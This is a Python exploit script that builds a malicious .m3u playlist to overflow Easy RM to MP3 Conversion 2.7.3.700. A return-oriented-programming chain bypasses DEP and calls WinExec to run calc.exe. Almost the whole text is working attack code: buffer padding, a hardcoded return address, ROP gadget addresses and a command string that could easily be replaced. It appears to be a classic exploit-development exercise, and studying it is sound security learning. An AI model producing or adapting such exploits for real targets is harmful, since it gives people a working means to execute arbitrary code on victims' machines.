#!/usr/bin/python
# Written By: Eric Van Zutphen
# Purpose: Easy RM to MP3 Conversion 2.7.3.700 DEP Bypass Exploit Using WinExec() WinAPI Call

import sys, struct
 
#---------------------------------------------------------[Structure]-#
# UINT WinExec(                                                       #
#  LPCSTR lpCmdLine,                                                  #
#  UINT   uCmdShow                                                    #
# );                                                                  #
#---------------------------------------------------------[Registers]-#
# EAX ???????? =>                                                     #
# ECX ???????? =>                                                     #
# EDX ???????? =>                                                     #
# EBX 00000000 => CMD Hide                                            #
# ESP ???????? => Pointer to calc.exe                                 #
# EBP FFFFFFFF => WinExec Return Address                              #
# ESI 7754e5fd => WinExec() WinAPI                                    #
# EDI 100308BF => ROPNop                                              #
#---------------------------------------------------------------------#

#-------------------------Return to Stack-----------------------------#
eip = struct.pack('<L',0x100308bf) # RETN
eip += struct.pack('<L',0x41414141) # COMPENSATE

#------------------- WinExec() WinAPI Call - 0x7754e5fd --------------#
rop = ''
rop += struct.pack('<L',0x10021558) # POP EBX # RETN
rop += struct.pack('<L',0xFFFFFFFF) # POP THIS INTO EBX
rop += struct.pack('<L',0x1002d993) # INC EBX# FPATAN # RETN
rop += struct.pack('<L',0x1002828D) # POP EBP # RETN
rop += struct.pack('<L',0xFFFFFFFF) # RET FOR WinExec
rop += struct.pack('<L',0x10013A0D) # POP ESI # RETN
rop += struct.pack('<L',0x7754e5fd) # WinExec Address
rop += struct.pack('<L',0x10023F3C) # POP EDI
rop += struct.pack('<L',0x100308bf) # RETN
rop += struct.pack('<L',0x1002CC86) # PUSHAD

cmd = 'calc.exe' + '\x00'


crash = "A"* 26063 + eip + rop + cmd + 'C' * (1000 - len(eip) - len(rop) - len(cmd))


print "\nLength of Payload: " + str(len(crash))
print "[+]ShellcoderZ.com[+]"


exploit_file = open ('exploit.m3u', "w")
exploit_file.write(crash)
exploit_file.close()
